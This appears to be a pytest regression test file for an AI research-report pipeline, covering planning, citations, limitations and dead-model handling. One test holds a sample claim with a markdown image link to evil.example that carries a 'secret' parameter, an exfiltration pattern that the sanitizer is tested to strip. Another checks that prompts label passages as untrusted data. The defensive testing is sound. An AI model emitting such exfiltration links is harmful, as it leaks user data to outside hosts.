"""Regression tests for the defects found in the 2026-09-30 audit (report quality and silent failure)."""

import json

import pytest

from research_assistant import deep_report as d


def llm_returning(**by_marker):
    """Fake model: the first marker found in the prompt decides the reply."""
    def llm(prompt, json_mode=False):
        for marker, reply in by_marker.items():
            if marker.replace("_", " ") in prompt:
                return reply(prompt) if callable(reply) else reply
        return ""
    return llm


HIT = {"title": "Doc", "heading": "", "text": "Hybrid retrieval reached 0.78 recall, beating BM25 at 0.61 recall."}
FACT = {"claim": "Hybrid beats BM25", "quote": "Hybrid retrieval reached 0.78 recall"}


# ---- one fact can answer several questions --------------------------------------------

def test_a_fact_found_for_question_1_still_reaches_the_section_for_question_2():
    llm = llm_returning(directly_support=json.dumps({"supported": True}), Extract_facts=json.dumps({"facts": [FACT]}))
    plan = d.Plan("g", "t", ["Q1?", "Q2?"], [{"title": "S1", "questions": [0], "brief": "", "synthesis": False},
                                              {"title": "S2", "questions": [1], "brief": "", "synthesis": False}])
    ev = d.gather_evidence(plan, lambda q: [HIT], llm)
    assert len(ev) == 1 and ev[0].sub_questions == [0, 1]                 # merged, not dropped
    seen = {}
    body = d.write_section(plan.outline[1], plan, ev, lambda p, json_mode=False: seen.setdefault("p", p) and "Wins [E1].")
    assert "[E1]" in seen["p"] and "No supporting evidence" not in body


# ---- planner robustness -------------------------------------------------------------

@pytest.mark.parametrize("reply", ["[1, 2]", '"just a string"', "null", "42", '{"sub_questions": "abc"}',
                                   '{"sub_questions": [1, null, "  "], "outline": "nope"}', "not json at all", ""])
def test_a_malformed_plan_never_crashes_and_always_has_a_synthesis_section(reply):
    plan = d.make_plan("my goal", lambda p, json_mode=False: reply)
    assert plan.sub_questions and all(isinstance(q, str) and q for q in plan.sub_questions)
    assert plan.outline and plan.outline[-1]["synthesis"] is True
    assigned = [i for sec in plan.outline for i in sec["questions"]]
    assert sorted(assigned) == list(range(len(plan.sub_questions)))


def plan_llm(questions, outline):
    return lambda p, json_mode=False: json.dumps({"title": "T", "sub_questions": questions, "outline": outline})


def test_drop_requests_remove_the_topic_instead_of_adding_it():
    llm = plan_llm(["What is RAG?", "What is the history of RAG?", "How does reranking work?"],
                   [{"title": "Basics", "questions": [0], "brief": ""},
                    {"title": "History of RAG", "questions": [1], "brief": ""},
                    {"title": "Reranking", "questions": [2], "brief": ""},
                    {"title": "Recommendations", "questions": [], "brief": ""}])
    plan = d.make_plan("goal", llm, notes="drop the history of RAG")
    assert [s["title"] for s in plan.outline] == ["Basics", "Reranking", "Recommendations"]
    assert plan.sub_questions == ["What is RAG?", "How does reranking work?"]
    assert [s["questions"] for s in plan.outline] == [[0], [1], []]        # indexes were remapped


def test_drop_request_that_matches_nothing_or_everything_leaves_the_plan_alone():
    llm = plan_llm(["What is RAG?", "How does reranking work?"],
                   [{"title": "All of it", "questions": [0, 1], "brief": ""}, {"title": "Recs", "questions": [], "brief": ""}])
    assert len(d.make_plan("goal", llm, notes="drop quantum gravity").sub_questions) == 2
    assert len(d.make_plan("goal", llm, notes="remove everything about RAG and reranking").sub_questions) >= 1


def test_short_topics_are_honoured():
    llm = plan_llm(["What is RAG?", "How does reranking work?"],
                   [{"title": "All", "questions": [0, 1], "brief": ""}, {"title": "Recs", "questions": [], "brief": ""}])
    plan = d.make_plan("goal", llm, notes="add AI safety")
    assert any("AI safety" in s["title"] for s in plan.outline)


# ---- the summary is held to the same standard as the sections --------------------------

def test_invented_citations_in_the_summary_are_removed_and_real_ones_reach_the_appendix():
    plan = d.Plan("g", "T", ["q"], [{"title": "S", "questions": [0], "brief": ""}])
    ev = [d.Evidence("E1", "claim one", "quote one here", "Src", "", [0]),
          d.Evidence("E2", "claim two", "quote two here", "Src", "", [0])]
    out = d.assemble(plan, [("S", "Body cites [E1].")], ev,
                     lambda p, json_mode=False: "Here is the summary:\nIt says [E2] and invents [E99].",
                     standards=d.rc.Standards(1, 1, 0.0))
    assert "[E99]" not in out and "Here is the summary" not in out
    assert "| E2 |" in out and "| E1 |" in out                              # E2 is cited only in the summary


def test_limitations_say_what_was_actually_searched_and_what_failed():
    plan = d.Plan("g", "T", ["q"], [{"title": "S", "questions": [0], "brief": ""}])
    ev = [d.Evidence("E1", "c", "quote text here", "Src", "", [0])]
    llm = lambda p, json_mode=False: "Summary."  # noqa: E731
    plain = d.assemble(plan, [("S", "Body [E1].")], ev, llm, library_size=10)
    assert "Nothing was searched on the web" in plain
    fetched = d.assemble(plan, [("S", "Body [E1].")], ev, llm, library_size=10,
                         scope_note="2 new sources were fetched for this run from arXiv.",
                         notes=["The model failed to answer 3 of 90 requests."])
    assert "Nothing was searched on the web" not in fetched
    assert "fetched for this run" in fetched and "failed to answer 3 of 90" in fetched
    assert "do not catch a source that is itself wrong" in fetched         # honest about what the checks cannot do


# ---- claims from untrusted documents -------------------------------------------------

def test_claims_cannot_smuggle_images_links_html_or_urls_into_the_report():
    dirty = "Hybrid wins ![x](http://evil.example/?d=secret) see [this](http://evil.example) <b>now</b> http://x.example/y"
    assert d._sanitize_claim(dirty) == "Hybrid wins see this now"


def test_a_quote_that_is_really_the_whole_passage_is_rejected():
    long_passage = " ".join(f"word{i}" for i in range(200))
    hit = {"title": "D", "text": long_passage, "heading": ""}
    llm = llm_returning(Extract_facts=json.dumps({"facts": [{"claim": "Everything", "quote": long_passage}]}),
                        directly_support=json.dumps({"supported": True}))
    assert d.extract_facts("q", hit, llm) == []


def test_quotes_must_come_from_the_part_of_the_passage_the_model_saw():
    hit = {"title": "D", "text": ("filler " * 3000) + "THE SECRET SENTENCE IS HERE AT THE VERY END", "heading": ""}
    assert len(hit["text"]) > d.MAX_PASSAGE_CHARS
    llm = llm_returning(Extract_facts=json.dumps({"facts": [{"claim": "c", "quote": "THE SECRET SENTENCE IS HERE"}]}),
                        directly_support=json.dumps({"supported": True}))
    assert d.extract_facts("q", hit, llm) == []


def test_the_extraction_and_judge_prompts_tell_the_model_the_passage_is_untrusted():
    seen = []
    llm = lambda p, json_mode=False: seen.append(p) or json.dumps({"facts": [FACT]}) if "Extract facts" in p \
        else (seen.append(p) or json.dumps({"supported": True}))  # noqa: E731
    d.extract_facts("q", HIT, llm)
    assert all("untrusted DATA" in p for p in seen) and len(seen) == 2


def test_the_judge_fails_closed_when_it_rejects_and_when_it_breaks():
    extract = json.dumps({"facts": [FACT]})
    rejects = llm_returning(Extract_facts=extract, directly_support=json.dumps({"supported": False}))
    breaks = llm_returning(Extract_facts=extract)                           # judge replies "" (model failure)
    garbage = llm_returning(Extract_facts=extract, directly_support="maybe?")
    assert d.extract_facts("q", HIT, rejects) == []
    assert d.extract_facts("q", HIT, breaks) == []
    assert d.extract_facts("q", HIT, garbage) == []


# ---- prompt size budgets ------------------------------------------------------------

def test_the_evidence_block_respects_its_budget_and_says_what_it_left_out():
    items = [d.Evidence(f"E{i}", "a fairly long claim " * 5, "some quote text here", "Src", "", [0]) for i in range(200)]
    block = d._evidence_block(items, limit=2000)
    assert len(block) < 2600 and "more facts omitted" in block and block.startswith("[E0]")


def test_clip_marks_the_cut_and_leaves_short_text_alone():
    assert d._clip("short", 100) == "short"
    clipped = d._clip("word " * 100, 50)
    assert len(clipped) < 70 and clipped.endswith("[cut]")


# ---- a dead model must not produce a "successful" empty report ---------------------------

def dead_llm():
    def boom(prompt, json_mode, attempt):
        raise ConnectionError("Ollama is not running")
    return d.resilient(boom, retries=1)


def test_health_check_passes_when_nothing_failed_and_raises_when_the_model_was_down():
    d.check_model_health({"calls": 50, "retries": 0, "gave_up": 0}, 0)                      # empty library is legitimate
    d.check_model_health({"calls": 50, "retries": 4, "gave_up": 2}, 30)                     # a few failures, real output
    with pytest.raises(d.ModelUnavailable):
        d.check_model_health({"calls": 50, "retries": 100, "gave_up": 50}, 0)               # everything failed
    with pytest.raises(d.ModelUnavailable):
        d.check_model_health({"calls": 50, "retries": 30, "gave_up": 12}, 0)                # many failed, nothing came out


def test_a_pipeline_run_against_a_dead_model_raises_instead_of_writing_an_empty_report():
    d.reset_stats()
    llm = dead_llm()
    with pytest.raises(d.ModelUnavailable, match="Ollama is running"):
        d.run("goal", lambda q: [HIT], llm, llm, llm, on_progress=lambda s: None)


def test_stats_reset_between_runs():
    d.reset_stats()
    dead_llm()("x")
    assert d.snapshot_stats()["gave_up"] == 1
    d.reset_stats()
    assert set(d.snapshot_stats().values()) == {0}                     # every counter, including the v3 check counts
